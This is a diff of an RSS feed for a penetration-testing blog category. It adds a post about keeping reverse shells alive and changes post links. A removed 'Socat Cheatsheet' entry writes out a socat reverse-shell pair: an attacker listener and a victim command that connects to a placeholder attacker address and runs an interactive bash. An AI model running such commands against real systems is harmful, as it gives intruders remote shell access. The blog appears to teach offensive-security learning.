@@ -4,12 +4,20 @@
         <link>/categories/penetration-testing/</link>
         <description>Penetration Testing - Category - </description>
         <generator>Hugo -- gohugo.io</generator><language>en</language><managingEditor>Securitynguyen@gmail.com (Nguyen Nguyen)</managingEditor>
-            <webMaster>Securitynguyen@gmail.com (Nguyen Nguyen)</webMaster><lastBuildDate>Tue, 04 Jul 2023 00:00:00 &#43;0000</lastBuildDate><atom:link href="/categories/penetration-testing/" rel="self" type="application/rss+xml" /><item>
+            <webMaster>Securitynguyen@gmail.com (Nguyen Nguyen)</webMaster><lastBuildDate>Thu, 06 Jul 2023 00:00:00 &#43;0000</lastBuildDate><atom:link href="/categories/penetration-testing/" rel="self" type="application/rss+xml" /><item>
+    <title>Reverse Shell Dying? No problem try this.</title>
+    <link>/posts/reverse-shell-dying/</link>
+    <pubDate>Thu, 06 Jul 2023 00:00:00 &#43;0000</pubDate>
+    <author>Nguyen Nguyen</author>
+    <guid>/posts/reverse-shell-dying/</guid>
+    <description><![CDATA[During my journey of learning Windows Escalation, I had my reverse shell dying when I tried to connect back to the service users. This really frustrate me. However, after a constant testing I figured an way to minimize the reverse shell from disconnectioning]]></description>
+</item>
+<item>
     <title>Unquoted Service Path - Windows Escalation</title>
-    <link>/posts/unquoted-service-path-windows-escalation/</link>
+    <link>/posts/windows-privilege-escalation/unquoted-service-path-windows-escalation/</link>
     <pubDate>Tue, 04 Jul 2023 00:00:00 &#43;0000</pubDate>
     <author>Nguyen Nguyen</author>
-    <guid>/posts/unquoted-service-path-windows-escalation/</guid>
+    <guid>/posts/windows-privilege-escalation/unquoted-service-path-windows-escalation/</guid>
     <description><![CDATA[Let's learn how Unquoted Service Paths can lead to a Windows Escalation]]></description>
 </item>
 <item>
@@ -79,17 +87,6 @@ You can access the target machine over your browser or use the SSH credentials b
     <author>Nguyen Nguyen</author>
     <guid>/posts/linux-privilege-escalation/kernel-exploits-linux-privilege-escalation/</guid>
     <description><![CDATA[One of the paths to privilege escalation on Linux is a Kernal Exploit. This post will be showcasing how Kernel Exploit works.]]></description>
-</item>
-<item>
-    <title>Socat Cheatsheet - Better netcat</title>
-    <link>/posts/linux-privilege-escalation/socat-red-team-tool/</link>
-    <pubDate>Tue, 20 Jun 2023 00:00:00 &#43;0000</pubDate>
-    <author>Nguyen Nguyen</author>
-    <guid>/posts/linux-privilege-escalation/socat-red-team-tool/</guid>
-    <description><![CDATA[Tool used to establish a more stabilize shell compare to netcat. Features:
-Used of the arrow key Allows for interactive commands such as sudo Use of CTRL + S, CTRL + C Reverse Shell for Linux Attacker:
-socat TCP-L:&lt;port&gt; FILE:tty,raw,echo=0 Victim: socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane Additional step: Open a new command prompt, and type stty-a, record the value of rows and columns
-Next, in your reverse/bind shell, type: stty rows &lt;number&gt;]]></description>
 </item>
 </channel>
 </rss>
